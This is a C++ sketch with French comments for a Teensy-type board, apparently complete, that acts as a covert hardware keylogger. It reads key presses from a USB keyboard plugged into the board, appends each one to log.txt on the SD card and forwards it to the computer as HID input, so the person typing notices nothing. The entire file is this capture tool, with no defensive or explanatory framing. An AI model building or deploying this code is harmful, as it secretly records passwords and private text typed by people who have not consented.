#include "USBHost_t36.h"
#include "SD.h"

// Définir les constantes
#define LOG_FILENAME "log.txt"

File dataLog;
USBHost myusb;
USBHub hub1(myusb);
KeyboardController keyboard1(myusb);
BluetoothController bluet(myusb);

USBHIDParser hid1(myusb);
USBHIDParser hid2(myusb);
USBHIDParser hid3(myusb);

void setup() {
  // Initialiser le port série
  Serial.begin(115200);
  while (!Serial) {}
  Serial.println("-- START --");

  // Initialiser l'objet USB
  myusb.begin();

  // Configurer le clavier pour détecter les pressions
  keyboard1.attachPress(onKeyPress);

  // Vérifier si la carte SD est présente
  if (!SD.begin(BUILTIN_SDCARD)) {
    Serial.println("Erreur d'initialisation de la carte SD.");
    while (1);
  }
  
  // Activer le clavier en mode HID (Human Interface Device)
  pinMode(0, INPUT_PULLUP);
  delay(1000);
  Keyboard.begin();
}

void loop() {
  myusb.Task();
}

void onKeyPress(int unicode) {
  // Convertir unicode en caractère
  char keyChar = (char)unicode;

  // Enregistrez les données sur la carte SD
  File logFile = SD.open(LOG_FILENAME, FILE_WRITE);
  if (logFile) {
    logFile.write(keyChar);
    logFile.close();
  } else {
    Serial.println("Erreur d'ouverture du fichier log.txt");
  }

  // Afficher la touche appuyée sur le moniteur série
  Serial.write(keyChar);

  // Envoyer la touche appuyée en mode HID
  Keyboard.write(keyChar);
}
